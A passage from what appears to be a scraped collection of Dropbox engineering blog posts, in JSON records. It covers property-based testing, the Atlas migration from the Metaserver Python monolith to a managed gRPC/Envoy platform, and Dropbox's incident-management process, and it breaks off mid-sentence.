we’re ensuring the stabilization of features that extend what can be built inside a form and how they're run. Since regressions in behavior are more visible, we can extend these features without sacrificing the customer experience. There are a few DSLs that get translated into protocols that other services speak. Those are the locations where we use symmetric properties. We’re continuing to work on our job executor to model stateful properties and this process is already yielding great results even though it’s still in its early stages. The other place that we're actively working on is our PDF mapping logic. We already use some basic property tests there, but our next step is to make mappings as robust as possible so we catch issues before a customer publishes their forms rather than when their users fill out the documents. This is one of those places where property tests can still solve the problem but a different approach might be just as robust and much quicker to implement. So far, property-based testing has had a lasting impact on our approach to building reliable software. Using them has brought to light many issues, both with our services and others. A few notable ones: It has caught issues with database adapters when there was a need to swap them out Unintentional changes to existing behaviors were found when adding new features to our form editor Five separate inconsistencies were found with our JSON Schema that were remedied just by building the tests (not even running them) Catching issues storing specific types of strings at the database level One ongoing battle is trying to figure out ways to quickly on-board people to using property testing. There is a steep learning curve and it’s hard to know where this approach adds value without any intuition on why it might be effective. Overall, property testing has been a high net-positive. Even if no one else on the team understands how to write property tests, when they fail it is clear why. They provide true equivalency testing to the team which is a gift that keeps on giving. It's been about eight months since the more complicated tests first shipped and there hasn't been a need to modify or correct them for six! Unit tests seem to come and go pretty quickly as they tend to focus a lot more on implementation details, even when the best effort is to test behavior. The initial cost of property tests are high but diminish as the team becomes more familiar with them, allowing engineers to build more interesting things quickly and stably. Conclusion Building a mental model for the tiered application structure and pairing that with property based testing has produced the side effect where multiple humans are no longer crammed into a makeshift closet sized war-room. Since application tiers account for a system’s sub-component priority, the areas to get hardened through property testing are clear. Because we have clear boundaries, each sub-component gradually becomes more isolated from external dependencies making their behaviors easier to test. Now when I come to work, I don’t feel like I’m fighting a battle in the dark that can’t be won. Instead, I leave the office before the sunlight disappears for the day!! Acknowledgements I’d like to say thank you to Garret Smith, Nick Ball, Benny Kao, Sheryl Chui, Santhana Parthasarathy. I’d also like to thank the rest of the HelloWorks and HelloSign teams for supporting me along the way. Fred Hebert has been an inspiration and influence in my development as the abundance of material that I learned directly from belong to him. Also, I wouldn’t even have bothered writing if it weren’t for the love and support of my wife and daughter. Thank you to Fanny Luor for making the graphics look great. Lastly, here’s to you! Thank you! If you enjoy, we’re hiring ! // Tags Application reliability // Copy link Link copied Link copied", "date": "2020-03-26"},
{"website": "Dropbox", "title": "Atlas: Our journey from a Python monolith to a managed platform", "author": ["Naphat Sanguansin"], "link": "https://dropbox.tech/infrastructure/atlas--our-journey-from-a-python-monolith-to-a-managed-platform", "abstract": "Metaserver: The Dropbox monolith SOA: the cost of operating independent services Atlas: a hybrid approach Technical design Execution Status Conclusion Dropbox, to our customers, needs to be a reliable and responsive service. As a company, we’ve had to scale constantly since our start, today serving more than 700M registered users in every time zone on the planet who generate at least 300,000 requests per second. Systems that worked great for a startup hadn’t scaled well, so we needed to devise a new model for our internal systems, and a way to get there without disrupting the use of our product. In this post, we’ll explain why and how we developed and deployed Atlas, a platform which provides the majority of benefits of a Service Oriented Architecture , while minimizing the operational cost that typically comes with owning a service. Monolith should be by choice The majority of software developers at Dropbox contribute to server-side backend code, and all server side development takes place in our server monorepo . We mostly use Python for our server-side product development, with more than 3 million lines of code belonging to our monolithic Python server. It works, but we realized the monolith was also holding us back as we grew. Developers wrangled daily with unintended consequences of the monolith. Every line of code they wrote was, whether they wanted or not, shared code—they didn’t get to choose what was smart to share, and what was best to keep isolated to a single endpoint. Likewise, in production, the fate of their endpoints was tied to every other endpoint, regardless of the stability, criticality, or level of ownership of these endpoints. In 2020, we ran a project to break apart the monolith and evolve it into a serverless managed platform, which would reduce code tangles and liberate services and their underlying engineering teams from being entwined with one another. To do so, we had to innovate both the architecture (e.g. standardizing on gRPC and using Envoy’s g RPC -HTTP transcoding ) and the operations (e.g. introducing autoscaling and canary analysis). This blog post captures key ideas and learnings from our journey. Metaserver: The Dropbox monolith Dropbox’s internal service topology as of today can be thought of as a “solar system” model, in which a lot of product functionality is served by the monolith, but platform-level components like authentication, metadata storage, filesystem, and sync have been separated into different services. About half of all commits to our server repository modify our large monolithic Python web application, Metaserver. Extremely simplified view of existing serving stack Metaserver is one of our oldest services, created in 2007 by one of our co-founders. It has served Dropbox well, but as our engineering team marched to deliver new features over the years, the organic growth of the codebase led to serious challenges. Tangled codebase Metaserver’s code was originally organized in a simple pattern one might expect to see in a small open source project—library, model, controllers—with no centralized curation or guardrails to ensure the sustainability of the codebase. Over the years, the Metaserver codebase grew to become one of the most disorganized and tangled codebases in the company. Copy //metaserver/controllers/ …\r\n//metaserver/model/ …\r\n//metaserver/lib/ … Metaserver Code Structure Because the codebase had multiple teams working on it, no single team felt strong ownership over codebase quality. For example, to unblock a product feature, a team would introduce import cycles into the codebase rather than refactor code. Even though this let us ship code faster in the short term, it left the codebase much less maintainable, and problems compounded. Inconsistent push cadence We push Metaserver to production for all our users daily. Unfortunately, with hundreds of developers effectively contributing to the same codebase, the likelihood of at least one critical bug being added every day had become fairly high. This would necessitate rollbacks and cherry picks of the entire monolith, and caused an inconsistent and unreliable push cadence for developers. Common best practices (for example, from Accelerate ) point to fast, consistent deploys as the key to developer productivity. We were nowhere close to ideal on this dimension. Inconsistent push cadence leads to unnecessary uncertainty in the development experience. For example, if a developer is working towards a product launch on day X, they aren’t sure whether their code should be submitted to our repository by day X-1, X-2 or even earlier, as another developer’s code might cause a critical bug in an unrelated component on day X and necessitate a rollback of the entire cluster completely unrelated to their own code. Infrastructure debt With a monolith of millions of lines of code, infrastructure improvements take much longer or never happen. For example, it had become impossible to stage a rollout of a new version of an HTTP framework or Python on only non-critical routes. Additionally, Metaserver uses a legacy Python framework unused in most other Dropbox services or anywhere else externally. While our internal infrastructure stack evolved to use industry standard open source systems like gRPC , Metaserver was stuck on a deprecated legacy framework that unsurprisingly had poor performance and caused maintenance headaches due to esoteric bugs. For example, the legacy framework only supports HTTP/1.0 while modern libraries have moved to HTTP/1.1 as the minimum version. Moreover, all the benefits we developed or integrated in our internal infrastructure, like i ntegrated metrics and tracing, had to be hackily redone for Metaserver which was built atop different internal frameworks. Over the past few years, we had spun up several workstreams to combat the issues we faced. Not all of them were all successful, but even those we gave up on paved the way to our current solution. SOA: the cost of operating independent services We tried to break up Metaserver as part of a larger push around a Service Oriented Architecture (SOA) initiative. The goal of SOA was to establish better abstractions and separation of concerns for functionalities at Dropbox—all problems that we wanted to solve in Metaserver. The execution plan was simple: make it easy for teams to operate independent services in production, then carve out pieces of Metaserver into independent services. Our SOA effort had two major milestones: Make it possible and easy to build services outside of Metaserver Extract core functionalities like identity management from the monolith and expose them via RPC, to allow new functionalities to be built outside of Metaserver Establish best practices and a production readiness process for smoothly and scalably onboarding new multiple services that serve customer-facing traffic, i.e. our live site services Break up Metaserver into smaller services owned and operated by various teams The SOA effort proved to be long and arduous. After over a year and a half, we were well into the first milestone. However, the experience from executing that first milestone exposed the flaws of the second milestone. As more teams and services were introduced into the critical path for customer traffic, we found it increasingly difficult to maintain a high reliability standard. This problem would only compound as we moved up the stack away from core functionalities and asked product teams to run services. No one solution for everything With this insight, we reassessed the problem. We found that product functionality at Dropbox could be divided into two broad categories: large, complex systems like all the logic around sharing a file small, self-contained functionality, like the homepage For example, the “Sharing” service involves stateful logic around access control, rate limits, and quotas. On the other hand, the homepage is a fairly simple wrapper around our metadata store/filesystem service. It doesn’t change too often and it has very limited day to day operational burden and failure modes. In fact, operational issues for most routes served by Dropbox had common themes, like unexpected spikes of external traffic, or outages in underlying services. This led us to an important conclusion: Small, self contained functionality doesn’t need independently operated services. This is why we built Atlas. It’s unnecessary overhead for a product team to plan capacity, set up good alerts and multihoming (automatically running in multiple data centers) for small, simple functionality. Teams mostly want a place where they can write some logic, have it automatically run when a user hits a certain route, and get some automatic basic alerts if there are too many errors in their route. The code they submit to the repository should be deployed consistently, quickly and continuously. Most of our product functionality falls into this category. Therefore, Atlas should optimize for this category. Large components should continue being their own services, with which Atlas happily coexists. Large systems can be operated by larger teams that sustainably manage the health of their systems. Teams should manage their own push schedules and set up dedicated alerts and verifiers. Atlas: a hybrid approach With the fundamental sustainability problems we had with Metaserver, and the learning that migrating Metaserver into many smaller services was not the right solution for everything, we came up with Atlas, a managed platform for the self-contained functionality use case. Atlas is a hybrid approach. It provides the user interface and experience of a “serverless” system like AWS Fargate to Dropbox product developers, while being backed by automatically provisioned services behind the scenes. As we said, the goal of Atlas is to provide the majority of benefits of SOA, while minimizing the operational costs associated with running a service. Atlas is “managed,” which means that developers writing code in Atlas only need to write the interface and implementation of their endpoints. Atlas then takes care of creating a production cluster to serve these endpoints. The Atlas team owns pushing to and monitoring these clusters. This is the experience developers might expect when contributing to a monolith versus Atlas: Before and after Atlas Goals We designed Atlas with five ideal outcomes in mind: Code structure improvements Metaserver had no real abstractions on code sharing, which led to coupled code. Highly coupled code can be the hardest to understand and refactor, and the most likely to sprout bugs when modified. We wanted to introduce a structure and reduce coupling so that new code would be easier to read and modify. Independent, consistent pushes The Metaserver push experience is great when it works. Product developers only have to worry about checking in code which will automatically get pushed to production. However, the aforementioned lack of push isolation led to an inconsistent experience. We wanted to create a platform where teams were not blocked on push due to a bug in unrelated code, and create the foundation for teams to push their own code in the future. Minimized operational busywork We aimed to keep the operational benefits of Metaserver while providing some of the flexibility of a service. We set up automatic capacity management, automatic alerts, automatic canary analysis, and an automatic push process so that the migration from a monolith to a managed platform was smooth for product developers. Infrastructure unification We wanted to unify all serving to standard open source components like gRPC. We don’t need to reinvent the wheel. Isolation Some features like the homepage are more important than others. We wanted to serve these independently, so that an overload or bug in one feature could not spill over to the rest of Metaserver. We evaluated using off-the-shelf solutions to run the platform. But in order to de-risk our migration and ensure low engineering costs, it made sense for us to continue hosting services on the same deployment orchestration platform used by the rest of Dropbox. However, we decided to remove custom components, such as our custom request proxy Bandaid , and replace them with open source systems like Envoy that met our needs. Technical design The project involved a few key efforts: Componentization De-tangle the codebase by feature into components, to prevent future tangles Enforce a single owner per component, so new functionality cannot be tacked onto a component by a non-owner Incentivize fewer shared libraries and more code sharing via RPC Orchestration Automatically configure each component into a service in our deployment orchestration platform with <50 lines of boilerplate code Configure a proxy (Envoy) to send a request for a particular route to the right service, instead of simply sending each request to a Metaserver node Configure services to speak to one another in gRPC instead of HTTP Operationalization Automatically configure a deployment pipeline that runs daily and pushes to production for each component Set up automatic alerts and automatic analysis for regressions to each push pipeline to automatically pause and rollback in case of any problems Automatically allocate additional hosts to scale up capacity via an autoscaler for each component based on traffic Let’s look at each of these in detail. Componentization Logical grouping of routes via servlets Atlas introduces Atlasservlets (pronounced “atlas servlets”) as a logical, atomic grouping of routes. For example, the home Atlasservlet contains all routes used to construct the homepage. The nav Atlasservlet contains all the routes used in the navigation bar on the Dropbox website. In preparation for Atlas, we worked with product teams to assign Atlasservlets to every route in Metaserver, resulting in more than 200 Atlasservlets across more than 5000 routes. Atlasservlets are an essential tool for breaking up Metaserver. Copy //atlas/home/ …\r\n//atlas/nav/ …\r\n//atlas/<some other atlasservlet>/ … Atlas code structure, organized by servlets Each Atlasservlet is given a private directory in the codebase. The owner of the Atlasservlet has full ownership of this directory; they may organize it however they wish, and no one else can import from it. The Atlasservlet code structure inherently breaks up the Metaserver code monolith, requiring every endpoint to be in a private directory and make code sharing an explicit choice rather than an unexpected outcome of contributing to the monolith. Having the Atlasservlet codified into our directory path also allows us to automatically generate production configs that would normally accompany a production service. Dropbox uses the Bazel build system for server side code, and we enforced prevention of imports through a Bazel feature called visibility rules , which allows library owners to control which code can use their libraries. Breakup of import cycles In order to break up our codebase, we had to break most of our Python import cycles. This took several years to achieve with a bunch of scripts and a lot of grunt work and refactoring. We prevented regressions and new import cycles through the same mechanism of Bazel visibility rules. Orchestration Atlas cluster strategy In Atlas, every Atlasservlet is its own cluster.  This gives us three important benefits: Isolation by default A misbehaving route will only impact other routes in the same Atlasservlet, which is owned by the same team anyway. Independent pushes Each Atlasservlet can be pushed separately, putting product developers in control of their own destiny with respect to the consistency of their pushes. Consistency Each Atlasservlet looks and behaves like any other internal service at Dropbox. So any tools provided by our infrastructure teams—e.g. periodic performance profiling—will work for all other teams’ Atlasservlets. gRPC Serving Stack One of our goals with Atlas was to unify our serving infrastructure. We chose to standardize on gRPC, a widely adopted tool at Dropbox. In order to continue to serve HTTP traffic, we used the gRPC-HTTP transcoding feature provided out of the box in Envoy, our proxy and load balancer. You can read more about Dropbox’s adoption of gRPC and Envoy in their respective blog posts. http transcoding In order to facilitate our migration to gRPC, we wrote an adapter which takes an existing endpoint and converts it into the interface that gRPC expects, setting up any legacy in-memory state the endpoint expects. This allowed us to automate most of the migration code change. It also had the benefit of keeping the endpoint compatible with both Metaserver and Atlas during mid-migration, so we could safely move traffic between implementations. Operationalization Atlas’s secret sauce is the managed experience. Developers can focus on writing features without worrying about many operational aspects of running the service in production, while still retaining the majority of benefits that come with standalone services, like isolation. The obvious drawback is that one team now bears the operational load of all 200+ clusters. Therefore, as part of the Atlas project we built several tools to help us effectively manage these clusters. Automated Canary Analysis Metaserver (and Atlas by extension) is stateless. As a result one of the most common ways a failure gets introduced into the system is through code changes. If we can ensure that our push guardrails are as airtight as possible, this eliminates the majority of failure scenarios. Canary analysis We automate our failure checking through a simple canary analysis service very similar to Netflix’s Kayenta . Each Atlas service consists of three deployments: canary, control, and production, with canary and control receiving only a small random percentage of traffic. During the push, canary is restarted with the newest version of the code. Control is restarted with the old version of the code but at the same time as canary to ensure the operate from the same starting point. We automatically compare metrics like CPU utilization and route availability from the canary and control deployments, looking for metrics where canary may have regressed relative to control. In a good push, canary will perform either equal to or better than control, and the push will be allowed to proceed. A bad push will be stopped automatically and the owners notified. In addition to canary analysis, we also have alerts set up which are checked throughout the process, including in between the canary, control, and production pushes of a single cluster. This lets us automatically pause and rollback the push pipeline if something goes wrong. Mistakes still happen. Bad changes may slip through. This is where Atlas’s default isolation comes in handy. Broken code will only impact its one cluster and can be rolled back individually, without blocking code pushes for the rest of the organization. Autoscaling and capacity planning Atlas's clustering strategy results in a large number of small clusters. While this is great for isolation, it significantly reduces the headroom each cluster has to handle increases in traffic. Monoliths are large shared clusters, so a small RPS increase on a route is easily absorbed by the shared cluster. But when each Atlasservlet is its own service, a 10x increase in route traffic is harder to handle. Capacity planning for 200+ clusters would cripple our team. Instead, we built an autoscaling system. The autoscaler monitors the utilization of each cluster in real time and automatically allocates machines to ensure that we stay above 40% free capacity headroom per cluster. This allows us to handle traffic increases as well as remove the need to do capacity planning. The autoscaling system reads metrics from Envoy’s Load Reporting Service and uses request queue length to decide cluster size, and probably deserves its own blog post. Execution Stepping stones, not milestones Many previous efforts to improve Metaserver had not succeeded due to the size and complexity of the codebase. This time around, we wanted to deliver value to product developers even if we didn’t succeed in fully replacing Metaserver with Atlas. The execution plan for Atlas was designed with stepping stones, not milestones (as elegantly described by former Dropbox engineer James Cowling), so that each incremental step would provide sufficient value in case the next part of the project failed for any reason. A few examples: We started off by speeding up testing frameworks in Metaserver, because we knew that an Atlas serving stack in tests might cause a regression in test times. We had a constraint to significantly improve memory efficiency and reduce OOM kills when we migrated from Metaserver to Atlas, since we would be able to pack more processes per host and consume less capacity during the migration. We focused on delivering memory efficiency purely to Metaserver instead of tying the improvements to the Atlas rollout. We designed a load test to prove that an Atlas MVP would be able to handle Metaserver traffic. We reused the load test to validate Metaserver’s performance on new hardware as part of a different project. We backported workflow simplifications as much as feasible to Metaserver. For example, we backported some of the workflow improvements in Atlas to our web workflows in Metaserver. Metaserver development workflows are divided into three categories based on the protocol: web, API, and internal gRPC. We focused Atlas on internal gRPC first to de-risk the new serving stack without needing the more risky parts like gRPC-HTTP transcoding. This in turn gave us an opportunity to improve workflows for internal gRPC independent of the remaining risky parts of Atlas. Hurdles With a large migration like this, it’s no surprise that we ran into a lot of challenges. The issues faced could be their own blog post. We’ll summarize a few of the most interesting ones: The legacy HTTP serving stack contained quirky, surprising, and hard to replicate behavior that had to be ported over to prevent regressions. We powered through with a combination of reading the original source code, reusing legacy library functions where required, relying on various existing integration tests, and designing a key set of tests that compare byte-by-byte outputs of the legacy and new systems to safely migrate. While splitting up Metaserver had wins in production, it was infeasible to spin up 200+ Python processes in our integration testing framework . We decided to merge the processes back into a monolith for local development and testing purposes. We also built heavy integration with our Bazel rules, so that the merging happens behind the scene and developers can reference Atlasservlets as regular services. Splitting up Metaserver in production broke many non-obvious assumptions that could not be caught easily in tests. For example, some infrastructure services had hardcoded the identity of Metaserver for access control. To minimize failures, we designed a meticulous and incremental migration plan with a clear understanding of the risks involved at each stage, and slowly monitored metrics as we rolled out the new system. Engineering workflows in Metaserver had grown organically with the monolith, arriving at a state where engineers had to page in an enormous amount of context to get the simplest work done. In order to ensure that Atlas prioritizes and solves major engineering pain points, we brought on key product developers as partners in the design, then went through several rounds of iteration to set up a roadmap that would definitively solve both product and infrastructural needs. Status Atlas is currently serving more than 25% of the previous Metaserver traffic. We have validated the remaining migration in tests. We’re on a clear path to deprecate Metaserver in the near future. Conclusion The single most important takeaway from this multi-year effort is that well-thought-out code composition, early in a project’s lifetime, is essential. Otherwise, technical debt and code complexity compounds very quickly. The dismantling of import cycles and decomposition of Metaserver into feature based directories was probably the most strategically effective part of the project, because it prevented new code from contributing to the problem and also made our code simpler to understand. By shipping a managed platform, we took a thoughtful approach on how to break up our Metaserver monolith. We learned that monoliths have many benefits ( as discussed by Shopify ) and blindly splitting up our monolith into services would have increased operational load to our engineering organization. In our view, developers don’t care about the distinction between monoliths and services, and simply want the lowest-overhead way to deliver end value to customers. So we have very little doubt that a managed platform which removes operational busywork like capacity planning, while providing maximum flexibility like fast releases, is the way forward. We’re excited to see the industry move toward such platforms. We’re hiring! If you’re interested in solving large problems with innovative, unique solutions—at a company where your push schedule is more predictable : ) —please check out our open positions . Acknowledgements Atlas was a result of the work of a large number of Dropboxers and Dropbox alumni, including but certainly not limited to: Agata Cieplik, Aleksey Kurkin, Andrew Deck, Andrew Lawson, David Zbarsky, Dmitry Kopytkov, Jared Hance, Jeremy Johnson, Jialin Xu, Jukka Lehtosalo, Karandeep Johar, Konstantin Belyalov, Ivan Levkivskyi, Lennart Jansson, Phillip Huang, Pranay Sowdaboina, Pranesh Pandurangan, Ruslan Nigmatullin, Taylor McIntyre, and Yi-Shu Tai. // Tags Infrastructure Python gRPC Service Oriented Architecture Envoy // Copy link Link copied Link copied", "date": "2021-03-04"},
{"website": "Dropbox", "title": "Lessons learned in incident management", "author": ["Joey Beyda"], "link": "https://dropbox.tech/infrastructure/lessons-learned-in-incident-management", "abstract": "Background The SEV process Detection Diagnosis Recovery Continuous improvement At Dropbox, we view incident management as a central element of our reliability efforts. Though we also employ proactive techniques such as Chaos engineering, how we respond to incidents has a significant bearing on our users’ experience. Every minute counts for our users during a potential site outage or product issue. The key components of our incident management process have been in place for several years, but we’ve also found constant opportunities to evolve in this area. The tweaks we’ve made over time include technological, organizational, and procedural improvements. This post goes deeper into some of the lessons Dropbox has learned in incident management. You probably won’t find all of these in a textbook description of an incident command structure, and you shouldn’t view these improvements as a one-size-fits-all approach for every company. (Their usefulness will depend on your tech stack, org size, and other factors.) Instead, we hope this serves as a case study for how you can take a systematic view of your organization’s own incident response and evolve it to meet your users’ needs. Background The basic framework for managing incidents at Dropbox, which we call SEVs (as in SEVerity), is similar to the ones employed by many other SaaS companies. (For those who are less familiar with the topic, we recommend this series of tutorials by Dropbox alum Tammy Butow to get an overview.) Availability SEVs, though by no means the only type of critical incident, are a useful slice to explore in more depth. No online service is immune to these incidents, and that includes Dropbox. Critical availability incidents are often the ones most disruptive to the largest number of users—just think about the last time your favorite website or SaaS app was down—so we find that these SEVs put the highest strain on the timeliness of our incident response. Success means shaving every possible minute from that response. Not only do we closely measure the impact time for our availability SEVs, but there are real business consequences for this metric. Every minute of impact means more unhappy users, increased churn, decreased signups, and reputation damage from social media and press coverage of an outage. Beyond this, Dropbox commits to an uptime SLA in contracts with some of our customers, particularly in mission-critical industries. We define this based on the overall availability of the systems that serve our users, and officially cross from “up” to “down” when our availability degrades past a certain threshold. To stay within our SLA of 99.9% uptime, we must limit any down periods to roughly 43 minutes total per month. We set the bar even higher for ourselves internally, targeting 99.95% (21 minutes per month). To safeguard these targets, we have invested in a variety of incident prevention techniques. These include Chaos engineering, risk assessments, and systems to validate production requirements, to name a few. However, no matter how much we probe and work to understand our systems, SEVs will still happen. That is where incident management comes in. The SEV process The SEV process at Dropbox dictates how our various incident-response roles work together to mitigate a SEV, and what steps we should take to learn from the incident. Every SEV at Dropbox has several basic features: A SEV type , which categorizes the incident’s impact; well-known examples include Availability, Durability, Security, and Feature Degradation A SEV level from 0-3, to indicate criticality; 0 is the most critical An IMOC (Incident Manager On Call) , who is responsible for spearheading a speedy mitigation, coordinating SEV respondents, and communicating the status of the incident A TLOC (Tech Lead On Call) , who drives the investigation and makes technical decisions SEVs with customer impact also include a BMOC (Business Manager On Call) , who manages non-engineering functions to provide external updates where needed. Depending on the scenario, this might include status page updates, direct customer communication, and in rare cases, regulatory notifications. Dropbox has built its own incident management tool, which we call DropSEV . Any Dropboxer can declare a SEV, which triggers the assignment of the roles above and creates a set of communication channels to handle the incident. These include a Slack channel for real-time collaboration, an email thread for broader updates, a Jira ticket to collect artifacts and data points, and a pre-populated postmortem document to be used for retrospection later. Employees can also subscribe to a specific Slack channel or email list to see the stream of new SEVs that are created. Here is a sample DropSEV entry to declare a minor availability incident for our mobile app. After a user creates an incident in DropSEV, the SEV process dictates the basic stages it will follow. Though there is a lot of nuance around that latter stage of generating a valuable postmortem with effective action items—see “ Postmortem Culture ” in the Google SRE Workbook—this post will focus more on the period before a SEV is mitigated, while the user experience is still impacted. To simplify, we break this up into three overall phases: Detection: The time it takes to identify an issue and alert a responder Diagnosis: The time it takes for responders to root-cause an issue, and/or identify a resolution approach Recovery: The time it takes to mitigate an issue for users once we have a resolution approach Remember our 21-minute max target for downtime in a month? That’s not a lot of time to detect, diagnose, and recover from a complex technical issue. We found that we had to optimize all three phases to make it happen. Detection The time it takes to identify an issue and alert a responder A reliable and efficient monitoring system When it comes to detecting issues at Dropbox, our monitoring systems are a key component. Over the years we’ve built and refined several systems that engineers rely on during an incident. First and foremost is Vortex, our sever-side metrics and alerting system. Vortex provides an ingestion latency on the order of seconds, a 10 second sampling rate, and a simple interface for services to define their own alerts. These features are key to driving down the time-to-detection for issues in production. In a previous blog post we unboxed the technical design, which is also shown below. An overview of the Vortex architecture. Check out our detailed blog post for more on Vortex. The 2018 redesign of this system was foundational for our reliability efforts. To understand why, think about that 21-minute internal target for monthly downtime. We needed to know that within tens of seconds of an incident beginning, Vortex would pick up these signals and alert the right responders via PagerDuty. If Vortex were unreliable or slow, our response would be hindered before it even began. Your organization may not use a homegrown monitoring system like ours, but ask yourself: just how quickly will its signals trigger your incident response? Optimizing metrics and alerts Vortex is key in quickly alerting on issues, but it is useless without well-defined metrics to alert on. In a lot of ways this is a hard problem to solve generally, since there will always be use case-specific metrics that teams will need to add themselves. We’ve tried to lessen the burden on service owners by providing a rich set of service, runtime, and host metrics that come for free. These metrics are baked into our RPC framework Courier , and our host-level infrastructure. In addition to a slew of standard metrics, Courier also provides distributed tracing and profiling to further aid in incident triage. Courier provides the same set of metrics in all languages we use at Dropbox (Go, Python, Rust, C++, Java). Though these out-of-the-box metrics are invaluable, noisy alerts are also a common challenge, and often make it hard to know if a page is for a real problem. We provide several tools to help alleviate this. The most powerful is an alert dependency system with which service owners can tie their alerts to other alerts, and silence a page if the problem is in some common dependency. This allows teams to avoid getting paged for issues that are not actionable by them, and act on true issues more quickly. Taking the human element out of filing incidents Our teams receive a wide variety of alerts from PagerDuty about the health of their systems, but not all of these are “SEV-worthy.” Historically this meant that a Dropbox first responder receiving a page had to worry not only about fixing the issue, but whether it was worthy of filing a SEV and kicking off the formal incident management process. This distinction could be confusing, especially for those who had less experience as an on-call for their team. To make the decision simpler, we revamped DropSEV (the incident management tool described earlier) to surface SEV definitions directly to users. For example, if you selected “Availability” as a SEV type in DropSEV, it would pop up a table like this one to map the degree of global availability impact to a SEV level. This was a step forward, but we realized the “do I file a SEV?” decision was still slowing down our responders. Let’s say you were on-call for the frontend component of Magic Pocket , our in-house multi-exabyte storage system, which is responsible for handling Get and Put requests for data blocks. When you received a page, you’d have to ask yourself a series of questions: Is availability dipping? By how much? Is this having an upstream impact on global availability? (Where’s the dashboard for that again?) By how much? How does that line up with the SEV table? That is not a smooth procedure, unless you are a highly trained on-call and you’ve seen your fair share of SEVs before. Even in the best case, in an outage it would cost us a couple minutes out of that critical 21-minute budget. A couple times SEVs weren’t even filed, meaning we missed out on involving the IMOC and BMOC while the technical team worked to restore availability. So this summer, we began automatically filing all availability SEVs. A service owner will still receive their own system alerts, but DropSEV will detect SEV-worthy availability impact and automatically kick off the formal incident response process. Service owners no longer have to distract themselves with filing the SEV, and we have higher confidence that all incident response roles will be involved. And critically, we shave minutes off of the response for every availability SEV. Where can you short-circuit human decision-making in your own incident response flow? Diagnosis The time it takes for responders to root-cause an issue, and/or identify a resolution approach Common on-call standards During the Diagnosis phase we often need to pull in additional responders to help beyond the initial recipients of an alert. We’ve built a “Page the on-call” button into our internal service directory, so a human can efficiently reach another team if needed. This is another way we’ve used PagerDuty for many years. Our technical service directory includes a reference to each team’s on-call, and a button to quickly page them if needed in an emergency. However, we found a critical variable which made it impossible to consistently keep our outages below 21 minutes: How is a team’s PagerDuty setup configured? Over time, well-intentioned teams at Dropbox made very different decisions on questions like these: How many layers does our escalation policy need? How much time should there be between each escalation? Across the entire escalation chain? How should our on-calls receive PagerDuty notifications? Do they need push, SMS, or phone calls set up, or a combination? After grappling with these inconsistencies in a few SEVs, we instituted a set of on-call checks which evaluated each team’s PagerDuty setup against common guidelines. We built an internal service that queries the PagerDuty API, runs our desired checking logic, and contacts teams about any violations. We made the hard decision to enforce these checks strictly, with zero exceptions. This was a challenging shift to make, since teams had gotten used to some flexibility, but having consistent answers to the questions above unlocked much more predictability in our incident response. After the initial buildup it was easy to iteratively add additional checks, and we found ways to make our initial set more nuanced (e.g. different standards depending on the criticality of your team’s services). In turn, your own on-call guidelines should be a function of the business requirements for incident response in your own organization. As of this post’s publication, PagerDuty has released an On-Call Readiness Report (for some of their plans) which allows you to run some similar checks within their platform. Though the coverage is not identical to what Dropbox built internally, it may be a good place to start if you want to quickly create some consistency. Triage Dashboards For our most critical services, such as the application that drives dropbox.com, we’ve built a series of triage dashboards that collect all the high-level metrics and provide a series of paths to narrow the focus of an investigation. For these critical systems, reducing the time it takes to triage is a top priority. These dashboards have reduced the effort needed to go from a general availability page, to finding the system at fault. Out-of-the-box dashboards for common root causes Though no two incidents or backend services are identical, we know that certain data points are valuable to our incident responders time and time again. To name a few: Client- and server-side error rates RPC latency Exception trends Queries per second (QPS) Outlier hosts (e.g. those with higher error rates) Top clients To shrink diagnosis time, we want these metrics to be available to every team when they need them most, so they don’t waste valuable minutes looking for the data that will point them to a root cause. To that end, we built an out-of-the-box dashboard that covers all of the above, and more. The build-up effort for a new service owner at Dropbox is zero, other than bookmarking the page. (We also encourage service owners to build more nuanced dashboards for their team-specific metrics.) A segment of the Grafana-based Courier dashboard that service owners receive out-of-the-box. The power of having a common platform like this is that you can easily iterate over time. Are we seeing a new pattern of root causes in our incidents? Great—we can add a panel to the common dashboard which surfaces that data. We’ve also invested in adding annotations in Grafana, which overlay key events (code pushes, DRTs, etc.) over the metrics to help engineers with correlation. Each of these iterations shrinks diagnosis time a little bit across the company. Exception Tracking One of the highest-signal tools Dropbox has for diagnosing issues is our exception tracking infrastructure. It allows any service at Dropbox to emit stack traces to a central store and tag them with useful metadata. The frontend allows developers to easily see and explore exception trends within their services. This ability to dive into exception data and analyze trends is super useful when diagnosing problems in our larger python applications. The Incident Manager’s role: clearing distractions During an outage or other critical incident, a lot of stakeholders are invested in what is going on while the SEV team is diagnosing the issue. Customer-facing teams need to provide updates and an ETA for resolution. Service owners in the blast radius of the affected system are curious about the technical details. Senior leaders, who are accountable for reliability and business objectives, want to convey urgency. And senior engineering leaders in particular may want to roll up their sleeves and join the diagnosis efforts. To make matters worse, the crosstalk in your incident Slack channels may have grown in 2020 as responders began working from home and could not collaborate in-person. At Dropbox, we’ve seen all of the above unfold during our incidents. However, we’ve sometimes struggled with a key element of the IMOC’s role: to shield the SEV team from these distractions. Thanks to the training they received, IMOCs generally knew the SEV process, associated terminology and tooling, and the expectations for postmortems and incident reviews. But they did not always know how to drive a war room and optimize the efficiency of our SEV response. We heard feedback from our engineers that IMOCs were not providing them the front-line support they needed, and distractions were slowing them down from diagnosing issues. We realized that we had not made those aspects of the IMOC role explicit, and the tribal knowledge of “what makes a good IMOC” had faded over time. A first step was updating our training to emphasize setting urgency, clearing distractions, and consolidating communication in one place. We are now working on game-like SEV scenarios where new IMOCs can actually practice these concepts before their first shift. Finally, we plan to increase the cadence of tabletop exercises involving a broader set of IMOCs, so the group can regularly evaluate its overall readiness. In addition, we established a Backup Response Team of senior IMOCs and TLOCs that could be pulled in for our most severe incidents. We gave them a clear playbook to assess the state of the incident and determine with the existing IMOC/TLOC if they should be transferred ownership. Giving these senior players an explicit, well-known role when necessary made them a valuable support structure, not a set of extra voices in Slack. The key lesson: pay attention to the delta between how your incident response process looks on paper, and how it works in practice. Recovery The time it takes to mitigate an issue for users once we have a resolution approach Envision mitigation scenarios At first, it may seem challenging to find a silver bullet for the Recovery stage. How do you optimize this part when every incident calls for a different mitigation strategy? This requires a lot of insight into how your systems behave, and the steps your incident responders would have to take in worst-case (but feasible) scenarios. As Dropbox pursued a 99.9% uptime SLA, we began running quarterly reliability risk assessments. This was a bottoms-up brainstorming process across our Infrastructure teams and others whose systems were likely to be involved in SEVs. Knowing we needed to optimize recovery times, we prompted the teams to focus on a simple question: “Which incident scenarios for your systems would take more than 20 minutes to mitigate?” This 